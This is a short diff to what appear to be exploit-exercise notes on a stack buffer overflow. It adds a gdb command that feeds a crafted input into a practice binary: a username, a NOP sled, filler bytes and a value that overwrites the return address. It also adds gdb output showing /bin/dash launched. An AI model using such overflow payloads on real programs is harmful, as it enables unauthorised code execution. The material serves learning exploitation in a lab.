@@ -61,6 +61,8 @@ also u can use the syntax:
 
 ```
 run < <(python -c 'print "dat_will"' && python -c 'print "A" * 80 + "BBBB"')
+run < <(python -c 'print "dat_will\n" + "\x90" * 59 + "C" * 21 + "BBBB"')
+
 x $ebp+4
 0xffffd6ec:	0x42424242
 ```
@@ -95,7 +97,12 @@ Segmentation fault (core dumped)
 
 
 
-
+error gdb
+```
+process 1707 is executing new program: /bin/dash
+warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
+Architecture of file not recognized.
+```
 
 
 
